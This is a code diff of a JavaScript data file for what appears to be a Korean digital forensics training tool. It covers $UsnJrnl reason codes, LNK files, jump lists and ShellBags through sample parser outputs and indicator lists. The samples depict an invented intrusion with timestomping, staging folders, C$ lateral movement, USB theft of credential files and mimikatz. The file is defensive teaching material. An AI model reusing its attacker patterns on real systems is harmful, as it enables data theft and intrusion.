-        ioc:"BasicInfoChange immediately after FileCreate, FileDelete 대량 발생 (침해 종료 시간대), DirectoryCreate Staging",
+        forensic:`FileCreate→BasicInfoChange 패턴 = Timestomping. FileCreate→FileDelete 쌍 = 존재했다가 삭제된 파일. DirectoryCreate(Staging) = 데이터 수집 스테이징 폴더.`,
+        ioc:`BasicInfoChange immediately after FileCreate, FileDelete 대량 발생 (침해 종료 시간대), DirectoryCreate Staging`,
       },
       {
         file:"$UsnJrnl",
         name:"$UsnJrnl Reason 코드 전체 가이드", threat:false,
         desc:"$UsnJrnl의 Reason 필드에 기록되는 코드 전체 목록과 의미. 여러 코드가 OR 결합되어 하나의 이벤트에 복수 코드가 나타날 수 있다.",
-        parse_output:"Reason 코드              16진수값   의미\n------------------------------------------------------------------\nFileCreate               0x00000100  파일 새로 생성됨\nFileDelete               0x00000200  파일 삭제됨\nDataOverwrite            0x00000001  파일 내용 덮어쓰기\nDataExtend               0x00000002  파일 크기 증가 (데이터 추가)\nDataTruncation           0x00000004  파일 크기 감소 (데이터 잘림)\nBasicInfoChange          0x00008000  타임스탬프·속성 변경 (Timestomping!)\nRenameOldName            0x00001000  이름 변경 — 이전 이름\nRenameNewName            0x00002000  이름 변경 — 새 이름\nSecurityChange           0x00000800  파일 권한(ACL) 변경\nStreamChange             0x00200000  대체 데이터 스트림(ADS) 변경\nObjectIdChange           0x00080000  객체 ID 변경\nCompressionChange        0x00020000  압축 속성 변경\nEncryptionChange         0x00040000  암호화 속성 변경\nDirectoryCreate          0x00000100  폴더 생성 (IsDirectory=True)\nDirectoryDelete          0x00000200  폴더 삭제 (IsDirectory=True)\nClose                    0x80000000  파일 핸들 닫힘 (이벤트 완료)\nIndexable                0x00004000  인덱싱 속성 변경\n\n[복합 이벤트 예시]\nFileCreate | DataExtend | Close  = 새 파일 생성 후 데이터 쓰고 핸들 닫음 (일반적 파일 생성)\nFileDelete | Close               = 파일 삭제 후 핸들 닫음 (완전 삭제)\nDataOverwrite | DataExtend       = 기존 파일 내용 변경 (수정)",
+        parse_output:`Reason 코드              16진수값   의미
+------------------------------------------------------------------
+FileCreate               0x00000100  파일 새로 생성됨
+FileDelete               0x00000200  파일 삭제됨
+DataOverwrite            0x00000001  파일 내용 덮어쓰기
+DataExtend               0x00000002  파일 크기 증가 (데이터 추가)
+DataTruncation           0x00000004  파일 크기 감소 (데이터 잘림)
+BasicInfoChange          0x00008000  타임스탬프·속성 변경 (Timestomping!)
+RenameOldName            0x00001000  이름 변경 — 이전 이름
+RenameNewName            0x00002000  이름 변경 — 새 이름
+SecurityChange           0x00000800  파일 권한(ACL) 변경
+StreamChange             0x00200000  대체 데이터 스트림(ADS) 변경
+ObjectIdChange           0x00080000  객체 ID 변경
+CompressionChange        0x00020000  압축 속성 변경
+EncryptionChange         0x00040000  암호화 속성 변경
+DirectoryCreate          0x00000100  폴더 생성 (IsDirectory=True)
+DirectoryDelete          0x00000200  폴더 삭제 (IsDirectory=True)
+Close                    0x80000000  파일 핸들 닫힘 (이벤트 완료)
+Indexable                0x00004000  인덱싱 속성 변경
+
+[복합 이벤트 예시]
+FileCreate | DataExtend | Close  = 새 파일 생성 후 데이터 쓰고 핸들 닫음 (일반적 파일 생성)
+FileDelete | Close               = 파일 삭제 후 핸들 닫음 (완전 삭제)
+DataOverwrite | DataExtend       = 기존 파일 내용 변경 (수정)`,
         interpretation:[
           { field:"Close 코드 포함", meaning:"핸들이 닫힌 시점 = 작업 완료 시점. FileCreate|Close의 시간 = 파일 생성 완료 시간" },
           { field:"FileCreate | DataExtend 연속", meaning:"파일 생성 후 데이터 추가. 단계적으로 파일이 쓰여지는 과정. 대용량 파일(압축본, 덤프)을 점진적으로 작성할 때 나타남" },
           { field:"BasicInfoChange 단독", meaning:"파일 내용 변경 없이 타임스탬프·속성만 변경. 전형적인 Timestomping 이벤트" },
           { field:"SecurityChange", meaning:"파일 권한 변경. 악성 파일을 Everyone 읽기·실행 가능으로 변경하는 준비 단계" },
         ],
-        forensic:"Reason 코드 조합 패턴으로 공격 행위를 정확히 식별. FileCreate+BasicInfoChange=Timestomping, DataExtend 반복=단계적 파일 작성.",
-        ioc:"BasicInfoChange 단독, FileCreate 직후 BasicInfoChange, SecurityChange on 악성 파일",
+        forensic:`Reason 코드 조합 패턴으로 공격 행위를 정확히 식별. FileCreate+BasicInfoChange=Timestomping, DataExtend 반복=단계적 파일 작성.`,
+        ioc:`BasicInfoChange 단독, FileCreate 직후 BasicInfoChange, SecurityChange on 악성 파일`,
       },
       {
         file:"$UsnJrnl",
         name:"$UsnJrnl 롤오버 & 수집 전략", threat:false,
         desc:"$UsnJrnl은 크기 제한이 있어 오래된 데이터부터 덮어씀. 수집 전략과 유실 여부 확인 방법.",
-        parse_output:"[$Max 스트림 정보 — 저널 크기 설정]\nMaximumSize:   0x0000000004000000  (64 MB — 기본값)\nAllocationDelta: 0x0000000000800000 (8 MB 단위 할당)\n\n[수집 가능한 USN 범위 확인]\n첫 번째 USN:   0x00000000 1A2B0000  (이전 데이터는 손실)\n현재 USN:      0x00000000 1F3A8C00\n손실 예상 기간: 약 7일치 이벤트 (시스템 활동량에 따라 다름)\n\n[롤오버 감지]\nMFT EntryId 847261 파일의 $UsnJrnl 첫 이벤트가\nFileCreate가 아닌 DataExtend로 시작 → 생성 이벤트가 롤오버로 손실됨\n\n[ExtractUsnJrnl 수집 명령]\nfsutil usn readjournal C: csv > usnjrnl_live.csv   (라이브 시스템)\nMFTECmd.exe -f $J --csv output\\\\                   (오프라인 이미지)",
+        parse_output:`[$Max 스트림 정보 — 저널 크기 설정]
+MaximumSize:   0x0000000004000000  (64 MB — 기본값)
+AllocationDelta: 0x0000000000800000 (8 MB 단위 할당)
+
+[수집 가능한 USN 범위 확인]
+첫 번째 USN:   0x00000000 1A2B0000  (이전 데이터는 손실)
+현재 USN:      0x00000000 1F3A8C00
+손실 예상 기간: 약 7일치 이벤트 (시스템 활동량에 따라 다름)
+
+[롤오버 감지]
+MFT EntryId 847261 파일의 $UsnJrnl 첫 이벤트가
+FileCreate가 아닌 DataExtend로 시작 → 생성 이벤트가 롤오버로 손실됨
+
+[ExtractUsnJrnl 수집 명령]
+fsutil usn readjournal C: csv > usnjrnl_live.csv   (라이브 시스템)
+MFTECmd.exe -f $J --csv output\\                   (오프라인 이미지)`,
         interpretation:[
           { field:"MaximumSize=64MB", meaning:"기본값. 시스템 활동이 활발하면 수일 분량만 유지. 보안 강화 환경에서는 512MB~1GB로 늘리기도 함" },
           { field:"첫 번째 USN vs 현재 USN 간격", meaning:"간격이 클수록 많은 이벤트 기록됨. 간격이 작으면 최근 롤오버 발생. 손실 없이 얼마나 거슬러 올라갈 수 있는지 파악 필수" },
           { field:"FileCreate 없이 DataExtend로 시작", meaning:"해당 파일의 생성 이벤트가 롤오버로 손실됨. MFT의 $FN 타임스탬프로 생성 시간을 대신 확인" },
           { field:"라이브 수집 vs 오프라인 분석", meaning:"라이브: fsutil usn readjournal (현재 활성 저널만). 오프라인: MFTECmd -f $J (이미지에서 추출, 전체 $J 스트림 분석 가능)" },
         ],
-        forensic:"사고 접수 즉시 $J 스트림 수집이 최우선. 시간이 지날수록 롤오버로 이벤트 손실. 수집 시 $J의 전체 크기를 메모할 것.",
-        ioc:"수집 지연으로 인한 롤오버 → FileCreate 이벤트 손실 → MFT $FN 타임스탬프로 보완",
+        forensic:`사고 접수 즉시 $J 스트림 수집이 최우선. 시간이 지날수록 롤오버로 이벤트 손실. 수집 시 $J의 전체 크기를 메모할 것.`,
+        ioc:`수집 지연으로 인한 롤오버 → FileCreate 이벤트 손실 → MFT $FN 타임스탬프로 보완`,
       },
     ],
     tips:[
@@ -606,16 +714,46 @@ const ARTIFACTS_DETAIL = [
       { path:"C:\\Users\\\\<user>\\\\Desktop\\\\*.lnk", desc:"바탕화면 바로가기" },
     ],
     tools:[
-      { name:"LECmd", desc:"Eric Zimmerman LNK 파서. 단일/.lnk 폴더 전체 파싱. CSV 출력", cmd:"LECmd.exe -d \"C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Windows\\Recent\" --csv output\\\\ --csvf lnk.csv" },
-      { name:"LECmd (단일)", desc:"특정 LNK 상세 분석", cmd:"LECmd.exe -f \"C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\malware.lnk\"" },
-      { name:"JLECmd", desc:"Eric Zimmerman 점프리스트 파서", cmd:"JLECmd.exe -d \"C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Windows\\Recent\" --csv output\\\\ --csvf jumplist.csv" },
+      { name:"LECmd", desc:"Eric Zimmerman LNK 파서. 단일/.lnk 폴더 전체 파싱. CSV 출력", cmd:`LECmd.exe -d "C:\Users\user\AppData\Roaming\Microsoft\Windows\Recent" --csv output\\ --csvf lnk.csv` },
+      { name:"LECmd (단일)", desc:"특정 LNK 상세 분석", cmd:`LECmd.exe -f "C:\Users\user\AppData\Roaming\Microsoft\Windows\Recent\malware.lnk"` },
+      { name:"JLECmd", desc:"Eric Zimmerman 점프리스트 파서", cmd:`JLECmd.exe -d "C:\Users\user\AppData\Roaming\Microsoft\Windows\Recent" --csv output\\ --csvf jumplist.csv` },
       { name:"Autopsy", desc:"LNK·점프리스트 자동 파싱 + 타임라인 통합" },
     ],
     keyItems:[
       {
         name:"LNK 핵심 메타데이터 전체", threat:false,
         desc:"LNK 파일 하나에 원본 파일·드라이브·네트워크·생성 PC에 대한 방대한 정보가 저장된다.",
-        parse_output:"[LECmd CSV 주요 컬럼 — 방산청_협력사_공문_2024.docx.lnk]\nSource Name:          방산청_협력사_공문_2024.docx.lnk\nSource Created:       2024-09-02 09:14:33   ← LNK 생성 = 파일 최초 접근 시간\nSource Modified:      2024-09-02 09:14:33\nSource Accessed:      2024-09-02 09:31:20\n\n[링크 대상 — 내장 드라이브]\nTarget Full Path:     C:\\Users\\victim\\\\Downloads\\\\방산청_협력사_공문_2024.docx\nTarget Created:       2024-09-02 09:13:45\nTarget Modified:      2024-09-02 09:13:45\nTarget Accessed:      2024-09-02 09:14:30\nTarget File Size:     245760 bytes\n\n[볼륨 정보]\nDrive Type:           Fixed  (0=Unknown, 1=NoRoot, 2=Removable/USB, 3=Fixed, 4=Network, 5=CD, 6=RAMDisk)\nVolume Serial:        0xA1B2C3D4\nVolume Label:         Windows\n\n[USB/외장 드라이브인 경우]\nDrive Type:           Removable   ← USB\nVolume Serial:        0xE5F6A7B8  ← USBSTOR 레지스트리의 시리얼과 교차 확인!\nTarget Full Path:     E:\\\\SecretDocs\\\\기밀_설계도면.dwg\n\n[네트워크 공유인 경우]\nDrive Type:           Network\nNetwork Share Path:   \\\\192.168.10.20\\\\C$\\\\Tools\\\\malware.exe  ← 측면이동 직접 증거!\nNetwork Share Name:   C$\n\n[생성 PC 정보]\nMachine ID (MAC):     00-1A-2B-3C-4D-5E   ← LNK 생성 당시 NIC MAC 주소\nNetBIOS Name:         ATTACKER-PC-007      ← 원본 컴퓨터명",
+        parse_output:`[LECmd CSV 주요 컬럼 — 방산청_협력사_공문_2024.docx.lnk]
+Source Name:          방산청_협력사_공문_2024.docx.lnk
+Source Created:       2024-09-02 09:14:33   ← LNK 생성 = 파일 최초 접근 시간
+Source Modified:      2024-09-02 09:14:33
+Source Accessed:      2024-09-02 09:31:20
+
+[링크 대상 — 내장 드라이브]
+Target Full Path:     C:\Users\victim\\Downloads\\방산청_협력사_공문_2024.docx
+Target Created:       2024-09-02 09:13:45
+Target Modified:      2024-09-02 09:13:45
+Target Accessed:      2024-09-02 09:14:30
+Target File Size:     245760 bytes
+
+[볼륨 정보]
+Drive Type:           Fixed  (0=Unknown, 1=NoRoot, 2=Removable/USB, 3=Fixed, 4=Network, 5=CD, 6=RAMDisk)
+Volume Serial:        0xA1B2C3D4
+Volume Label:         Windows
+
+[USB/외장 드라이브인 경우]
+Drive Type:           Removable   ← USB
+Volume Serial:        0xE5F6A7B8  ← USBSTOR 레지스트리의 시리얼과 교차 확인!
+Target Full Path:     E:\\SecretDocs\\기밀_설계도면.dwg
+
+[네트워크 공유인 경우]
+Drive Type:           Network
+Network Share Path:   \\192.168.10.20\\C$\\Tools\\malware.exe  ← 측면이동 직접 증거!
+Network Share Name:   C$
+
+[생성 PC 정보]
+Machine ID (MAC):     00-1A-2B-3C-4D-5E   ← LNK 생성 당시 NIC MAC 주소
+NetBIOS Name:         ATTACKER-PC-007      ← 원본 컴퓨터명`,
         interpretation:[
           { field:"Source Created (LNK 생성 시간)", meaning:"파일을 처음 열었을 때 자동 생성. = 파일 최초 접근 시점. 파일 삭제 후에도 이 시간이 남음" },
           { field:"Drive Type=Removable (2)", meaning:"USB 또는 외장드라이브에서 파일 열람. Volume Serial로 USBSTOR 레지스트리와 교차 → 특정 USB 기기 확정" },
@@ -625,13 +763,32 @@ const ARTIFACTS_DETAIL = [
           { field:"NetBIOS Name", meaning:"LNK를 생성한 컴퓨터의 네트워크 이름. 내부 자산목록과 대조하면 원본 PC 특정" },
           { field:"Target File Size vs MFT", meaning:"LNK에 기록된 크기와 MFT 파일 크기 비교. 불일치 시 파일이 수정되거나 교체된 것" },
         ],
-        forensic:"Drive Type=Network + Network Share Path = 측면 이동 확정. Drive Type=Removable + Volume Serial = USB 반출 확정.",
-        ioc:"Drive Type=Removable, Network Share Path \\\\\\내부IP\\\\C$, 다른 컴퓨터의 MAC/NetBIOS Name",
+        forensic:`Drive Type=Network + Network Share Path = 측면 이동 확정. Drive Type=Removable + Volume Serial = USB 반출 확정.`,
+        ioc:`Drive Type=Removable, Network Share Path \\\내부IP\\C$, 다른 컴퓨터의 MAC/NetBIOS Name`,
       },
       {
         name:"점프리스트 (AutomaticDestinations)", threat:false,
         desc:"앱별 최근 파일 목록. LNK보다 더 많은 이력을 보관. AppId로 어떤 앱으로 파일을 열었는지 특정 가능.",
-        parse_output:"[JLECmd CSV — Microsoft Word AutomaticDestinations]\nAppId:              d3b233c31b22c7ac  (= Microsoft Word)\nAppIdDescription:   Microsoft Word 2016\nSource Created:     2024-08-01 09:00:00\nSource Modified:    2024-09-05 16:45:00\n\nEntry#  TargetPath                                           Created               Modified              Accessed              FileSize\n--------------------------------------------------------------------------------------------------------------------------------------\n0       C:\\Users\\victim\\\\Downloads\\\\방산청_공문_2024.docx      2024-09-02 09:13:45   2024-09-02 09:13:45   2024-09-02 09:14:30   245760\n1       D:\\\\Research\\\\기밀_설계도면_Rev5.dwg                    2024-09-03 14:00:00   2024-09-04 09:30:00   2024-09-04 09:30:00   10485760  ← 기밀!\n2       C:\\Users\\victim\\\\Documents\\\\직원_급여_DB.xlsx           2024-09-04 11:00:00   2024-09-04 11:20:00   2024-09-04 11:20:00   87040\n3       \\\\192.168.10.20\\\\Research\\\\핵심기술_최종.docx          2024-09-05 10:00:00   2024-09-05 14:00:00   2024-09-05 14:00:00   524288    ← 네트워크 공유!\n4       E:\\backup\\\\credentials_backup.txt                      2024-09-05 22:00:00   2024-09-05 22:05:00   2024-09-05 22:05:00   1024      ← USB+자격증명!\n\n[주요 AppId 목록]\nd3b233c31b22c7ac = Microsoft Word\n5d696d521de238c3 = Microsoft Excel\nb8ab77100df80ab3 = Windows Explorer\n9b9cdc69c08f26b8 = Notepad\na7bd71699cd38d1c = Adobe Acrobat Reader",
+        parse_output:`[JLECmd CSV — Microsoft Word AutomaticDestinations]
+AppId:              d3b233c31b22c7ac  (= Microsoft Word)
+AppIdDescription:   Microsoft Word 2016
+Source Created:     2024-08-01 09:00:00
+Source Modified:    2024-09-05 16:45:00
+
+Entry#  TargetPath                                           Created               Modified              Accessed              FileSize
+--------------------------------------------------------------------------------------------------------------------------------------
+0       C:\Users\victim\\Downloads\\방산청_공문_2024.docx      2024-09-02 09:13:45   2024-09-02 09:13:45   2024-09-02 09:14:30   245760
+1       D:\\Research\\기밀_설계도면_Rev5.dwg                    2024-09-03 14:00:00   2024-09-04 09:30:00   2024-09-04 09:30:00   10485760  ← 기밀!
+2       C:\Users\victim\\Documents\\직원_급여_DB.xlsx           2024-09-04 11:00:00   2024-09-04 11:20:00   2024-09-04 11:20:00   87040
+3       \\192.168.10.20\\Research\\핵심기술_최종.docx          2024-09-05 10:00:00   2024-09-05 14:00:00   2024-09-05 14:00:00   524288    ← 네트워크 공유!
+4       E:\backup\\credentials_backup.txt                      2024-09-05 22:00:00   2024-09-05 22:05:00   2024-09-05 22:05:00   1024      ← USB+자격증명!
+
+[주요 AppId 목록]
+d3b233c31b22c7ac = Microsoft Word
+5d696d521de238c3 = Microsoft Excel
+b8ab77100df80ab3 = Windows Explorer
+9b9cdc69c08f26b8 = Notepad
+a7bd71699cd38d1c = Adobe Acrobat Reader`,
         interpretation:[
           { field:"AppId / AppIdDescription", meaning:"파일을 열 때 사용한 앱 특정. Explorer AppId는 탐색기로 탐색한 폴더도 포함" },
           { field:"Entry# 순서", meaning:"가장 최근 열람 순서. 0이 최근. 공격자의 파일 접근 순서와 흐름 파악" },
@@ -639,20 +796,38 @@ const ARTIFACTS_DETAIL = [
           { field:"USB 경로 (E:\\\\...) + 자격증명 파일명", meaning:"USB로 자격증명 파일 반출 직접 증거. LNK Volume Serial과 교차하면 특정 USB 확정" },
           { field:"Source Modified 시간", meaning:"점프리스트 파일 자체가 마지막으로 수정된 시간 = 마지막 파일 접근 시간" },
         ],
-        forensic:"점프리스트는 LNK보다 더 오래된 이력 보관. credentials, password, 기밀, backup 키워드 파일명 우선 검토.",
-        ioc:"자격증명 파일(.txt .xlsx), VPN·SSH 설정 파일, 기밀 문서, 네트워크 공유 경로 파일 접근",
+        forensic:`점프리스트는 LNK보다 더 오래된 이력 보관. credentials, password, 기밀, backup 키워드 파일명 우선 검토.`,
+        ioc:`자격증명 파일(.txt .xlsx), VPN·SSH 설정 파일, 기밀 문서, 네트워크 공유 경로 파일 접근`,
       },
       {
         name:"LNK 타임스탬프 비교 분석", threat:true,
         desc:"LNK에는 LNK 파일 자체의 타임스탬프와 원본 파일의 타임스탬프가 모두 기록된다. 이 둘의 관계로 파일 조작 여부를 탐지할 수 있다.",
-        parse_output:"[LNK 타임스탬프 정합성 분석]\n\n케이스 1: 정상 패턴\nSource Created:       2024-09-02 09:14:33  (LNK 생성 = 파일 최초 열람)\nTarget Created:       2024-09-02 09:13:45  (원본 파일 생성)\nTarget Modified:      2024-09-02 09:13:45\n→ Target Created < Source Created 정상 (파일 생성 후 열람)\n\n케이스 2: Timestomping 탐지\nSource Created:       2024-09-02 09:14:33  (LNK 생성 — 변조 불가)\nTarget Created:       2019-01-15 08:00:00  (원본 파일 $SI 시간 — 변조됨!)\n→ LNK Source Created 2024년, Target Created 2019년 = Timestomping 확정!\n→ 실제 드롭 시간: 2024-09-02 09:13~09:14 (LNK 기준)\n\n케이스 3: USB 반출 후 LNK 남음\nSource Created:       2024-09-05 22:05:33\nDrive Type:           Removable\nTarget Full Path:     E:\\backup\\\\design_final.dwg\n→ 원본 파일 없지만 LNK로 USB에서 파일 열었음 증명",
+        parse_output:`[LNK 타임스탬프 정합성 분석]
+
+케이스 1: 정상 패턴
+Source Created:       2024-09-02 09:14:33  (LNK 생성 = 파일 최초 열람)
+Target Created:       2024-09-02 09:13:45  (원본 파일 생성)
+Target Modified:      2024-09-02 09:13:45
+→ Target Created < Source Created 정상 (파일 생성 후 열람)
+
+케이스 2: Timestomping 탐지
+Source Created:       2024-09-02 09:14:33  (LNK 생성 — 변조 불가)
+Target Created:       2019-01-15 08:00:00  (원본 파일 $SI 시간 — 변조됨!)
+→ LNK Source Created 2024년, Target Created 2019년 = Timestomping 확정!
+→ 실제 드롭 시간: 2024-09-02 09:13~09:14 (LNK 기준)
+
+케이스 3: USB 반출 후 LNK 남음
+Source Created:       2024-09-05 22:05:33
+Drive Type:           Removable
+Target Full Path:     E:\backup\\design_final.dwg
+→ 원본 파일 없지만 LNK로 USB에서 파일 열었음 증명`,
         interpretation:[
           { field:"LNK Source Created vs MFT Created 비교", meaning:"LNK 생성 시간은 변조하기 어려움. MFT $SI가 Timestomped 됐어도 LNK로 실제 접근 시간 파악 가능" },
           { field:"Target Created 시간이 비현실적으로 오래됨", meaning:"Timestomping 의심. LNK Source Created가 실제 드롭 시간에 가까움" },
           { field:"Drive Type=Removable + 원본 없음", meaning:"USB는 이미 제거됐지만 LNK로 접근 사실 증명 가능. Volume Serial로 USB 특정" },
         ],
-        forensic:"LNK Source Created는 Timestomping에 면역. MFT $SI와 LNK를 교차하면 변조된 타임스탬프 탐지 가능.",
-        ioc:"LNK Source Created와 Target Created(MFT $SI) 수년 차이, Removable 드라이브 LNK만 남고 원본 없음",
+        forensic:`LNK Source Created는 Timestomping에 면역. MFT $SI와 LNK를 교차하면 변조된 타임스탬프 탐지 가능.`,
+        ioc:`LNK Source Created와 Target Created(MFT $SI) 수년 차이, Removable 드라이브 LNK만 남고 원본 없음`,
       },
     ],
     tips:[
@@ -678,16 +853,30 @@ const ARTIFACTS_DETAIL = [
       { path:"파일 위치: C:\\Users\\\\<user>\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\UsrClass.dat", desc:"UsrClass 파일 위치" },
     ],
     tools:[
-      { name:"ShellBagsExplorer (SBE)", desc:"Eric Zimmerman GUI 도구. 폴더 트리 시각화. 직관적인 타임라인 뷰 제공", cmd:"ShellBagsExplorer.exe (GUI — NTUSER.DAT 또는 UsrClass.dat 로드)" },
-      { name:"SBECmd", desc:"Eric Zimmerman 명령줄 파서. CSV 출력. 자동화·일괄 처리 가능", cmd:"SBECmd.exe -d \"C:\\Users\" --csv output\\\\ --csvf shellbag.csv" },
-      { name:"SBECmd (단일 파일)", desc:"특정 하이브 파일 분석", cmd:"SBECmd.exe -f \"C:\\Users\\victim\\UsrClass.dat\" --csv output\\\\ --csvf sb.csv" },
+      { name:"ShellBagsExplorer (SBE)", desc:"Eric Zimmerman GUI 도구. 폴더 트리 시각화. 직관적인 타임라인 뷰 제공", cmd:`ShellBagsExplorer.exe (GUI — NTUSER.DAT 또는 UsrClass.dat 로드)` },
+      { name:"SBECmd", desc:"Eric Zimmerman 명령줄 파서. CSV 출력. 자동화·일괄 처리 가능", cmd:`SBECmd.exe -d "C:\Users" --csv output\\ --csvf shellbag.csv` },
+      { name:"SBECmd (단일 파일)", desc:"특정 하이브 파일 분석", cmd:`SBECmd.exe -f "C:\Users\victim\UsrClass.dat" --csv output\\ --csvf sb.csv` },
       { name:"Registry Explorer", desc:"레지스트리 탐색기로 BagMRU 키 직접 열람" },
     ],
     keyItems:[
       {
         name:"폴더 탐색 이력 — 전체 경로 & 시간", threat:false,
         desc:"탐색기로 클릭하여 들어간 모든 폴더. 삭제된 폴더·USB·네트워크 공유 경로까지 기록.",
-        parse_output:"[SBECmd CSV 출력 — 주요 컬럼]\nAbsolutePath                                          FirstInteracted          LastInteracted           MRUOrder  SlotModified\n-----------------------------------------------------------------------------------------------------------------------------------------------------------\nC:\\\\                                                    2023-01-15 09:00:00      2024-09-15 03:10:00      0         2024-09-15 03:10\nC:\\\\Staging                                             2024-09-03 14:22:01      2024-09-10 22:28:00      1         2024-09-10 22:28  ← 스테이징 폴더!\nC:\\\\Staging\\\\Research                                   2024-09-03 14:25:44      2024-09-10 22:25:33      2         2024-09-10 22:25\nC:\\\\Staging\\\\Credentials                                2024-09-04 11:20:00      2024-09-05 09:00:00      3         2024-09-05 09:00  ← 자격증명 폴더!\nC:\\\\Windows\\\\Temp                                       2024-09-02 09:35:00      2024-09-15 03:12:00      4         2024-09-15 03:12  ← 악성파일 확인\nC:\\\\ProgramData\\\\MicrosoftUpdate                        2024-09-02 09:33:00      2024-09-02 09:33:00      5         2024-09-02 09:33\nD:\\\\Research                                            2024-09-03 14:00:00      2024-09-10 22:00:00      6         2024-09-10 22:00  ← 연구자료!\nD:\\\\Research\\\\핵심기술_2024                             2024-09-03 14:05:00      2024-09-10 21:55:00      7         2024-09-10 21:55\nE:\\\\ (이동식 드라이브)                                   2024-09-05 22:08:00      2024-09-05 22:30:00      8         2024-09-05 22:30  ← USB!\nE:\\backup                                              2024-09-05 22:10:00      2024-09-05 22:25:00      9         2024-09-05 22:25\n\\\\192.168.10.20\\\\C$                                   2024-09-02 11:15:00      2024-09-07 03:00:00      10        2024-09-07 03:00  ← 측면이동!\n\\\\192.168.10.20\\\\C$\\\\Tools                             2024-09-02 11:15:30      2024-09-07 03:05:00      11        2024-09-07 03:05",
+        parse_output:`[SBECmd CSV 출력 — 주요 컬럼]
+AbsolutePath                                          FirstInteracted          LastInteracted           MRUOrder  SlotModified
+-----------------------------------------------------------------------------------------------------------------------------------------------------------
+C:\\                                                    2023-01-15 09:00:00      2024-09-15 03:10:00      0         2024-09-15 03:10
+C:\\Staging                                             2024-09-03 14:22:01      2024-09-10 22:28:00      1         2024-09-10 22:28  ← 스테이징 폴더!
+C:\\Staging\\Research                                   2024-09-03 14:25:44      2024-09-10 22:25:33      2         2024-09-10 22:25
+C:\\Staging\\Credentials                                2024-09-04 11:20:00      2024-09-05 09:00:00      3         2024-09-05 09:00  ← 자격증명 폴더!
+C:\\Windows\\Temp                                       2024-09-02 09:35:00      2024-09-15 03:12:00      4         2024-09-15 03:12  ← 악성파일 확인
+C:\\ProgramData\\MicrosoftUpdate                        2024-09-02 09:33:00      2024-09-02 09:33:00      5         2024-09-02 09:33
+D:\\Research                                            2024-09-03 14:00:00      2024-09-10 22:00:00      6         2024-09-10 22:00  ← 연구자료!
+D:\\Research\\핵심기술_2024                             2024-09-03 14:05:00      2024-09-10 21:55:00      7         2024-09-10 21:55
+E:\\ (이동식 드라이브)                                   2024-09-05 22:08:00      2024-09-05 22:30:00      8         2024-09-05 22:30  ← USB!
+E:\backup                                              2024-09-05 22:10:00      2024-09-05 22:25:00      9         2024-09-05 22:25
+\\192.168.10.20\\C$                                   2024-09-02 11:15:00      2024-09-07 03:00:00      10        2024-09-07 03:00  ← 측면이동!
+\\192.168.10.20\\C$\\Tools                             2024-09-02 11:15:30      2024-09-07 03:05:00      11        2024-09-07 03:05`,
         interpretation:[
           { field:"AbsolutePath (절대 경로)", meaning:"탐색기로 클릭하여 진입한 폴더 경로. 폴더 삭제 후에도 여기에 경로가 남아 존재했음을 증명" },
           { field:"FirstInteracted", meaning:"해당 폴더를 처음 탐색기로 열어본 시간. 스테이징 폴더 최초 생성/접근 시점과 연계 분석" },
@@ -698,32 +887,59 @@ const ARTIFACTS_DETAIL = [
           { field:"E:\\\\ (이동식)", meaning:"USB 드라이브 탐색. LNK Volume Serial + USBSTOR 레지스트리와 교차하면 특정 USB 확정" },
           { field:"\\\\192.168.10.20\\\\C$ (네트워크)", meaning:"내부 서버 C$ 관리 공유 직접 접근. 측면 이동 + 파일 정찰 확정. IP로 피해 서버 특정" },
         ],
-        forensic:"네트워크 경로 + 스테이징 폴더 조합은 APT의 전형적 패턴. C:\\\\Staging + D:\\\\Research + \\\\\\내부IP 3종이 모두 있으면 침해 확정 수준.",
-        ioc:"C:\\\\Staging 또는 C:\\\\Collect 등 비정상 수집 폴더, \\\\\\내부IP\\\\ADMIN$ 또는 \\\\\\내부IP\\\\C$, E:\\\\ 이동식 접근",
+        forensic:`네트워크 경로 + 스테이징 폴더 조합은 APT의 전형적 패턴. C:\\Staging + D:\\Research + \\\내부IP 3종이 모두 있으면 침해 확정 수준.`,
+        ioc:`C:\\Staging 또는 C:\\Collect 등 비정상 수집 폴더, \\\내부IP\\ADMIN$ 또는 \\\내부IP\\C$, E:\\ 이동식 접근`,
       },
       {
         name:"ZIP·압축 파일 내부 탐색 이력", threat:true,
         desc:"ZIP 파일을 탐색기로 열어 내부를 탐색한 경우도 쉘백에 기록됨. 악성 페이로드 압축 파일 내부 탐색 흔적 탐지.",
-        parse_output:"[UsrClass.dat 쉘백 — ZIP 내부 탐색]\nAbsolutePath\n--------------------------------------------------------------\nC:\\Users\\victim\\\\Downloads\\tools.zip\nC:\\Users\\victim\\\\Downloads\\tools.zip\\\\mimikatz_x64\nC:\\Users\\victim\\\\Downloads\\tools.zip\\\\mimikatz_x64\\x64\nC:\\Users\\victim\\\\Downloads\\tools.zip\\\\procdump\n\nFirstInteracted: 2024-09-02 10:40:00\nLastInteracted:  2024-09-02 10:42:00\n\n[참고: NTUSER.DAT vs UsrClass.dat]\nNTUSER.DAT:   상위 폴더 접근만 기록 (C:\\Users\\victim\\\\Downloads\\\\)\nUsrClass.dat: ZIP 내부 경로까지 상세 기록 → 반드시 둘 다 분석!",
+        parse_output:`[UsrClass.dat 쉘백 — ZIP 내부 탐색]
+AbsolutePath
+--------------------------------------------------------------
+C:\Users\victim\\Downloads\tools.zip
+C:\Users\victim\\Downloads\tools.zip\\mimikatz_x64
+C:\Users\victim\\Downloads\tools.zip\\mimikatz_x64\x64
+C:\Users\victim\\Downloads\tools.zip\\procdump
+
+FirstInteracted: 2024-09-02 10:40:00
+LastInteracted:  2024-09-02 10:42:00
+
+[참고: NTUSER.DAT vs UsrClass.dat]
+NTUSER.DAT:   상위 폴더 접근만 기록 (C:\Users\victim\\Downloads\\)
+UsrClass.dat: ZIP 내부 경로까지 상세 기록 → 반드시 둘 다 분석!`,
         interpretation:[
           { field:"ZIP 내부 경로", meaning:"압축 파일을 탐색기로 열어 내부를 탐색한 흔적. 공격자가 어떤 공격 도구가 들어있는지 확인한 것" },
           { field:"UsrClass.dat에만 존재", meaning:"NTUSER.DAT에는 ZIP 파일 경로까지만, UsrClass.dat에는 ZIP 내부 폴더 구조까지 상세히 기록됨" },
           { field:"접근 시간 + 파일명", meaning:"mimikatz, procdump, meterpreter 등 공격 도구명이 경로에 포함되면 직접 증거" },
         ],
-        forensic:"UsrClass.dat 쉘백의 ZIP 내부 경로에 공격 도구명이 있으면 도구 탐색 확정 증거.",
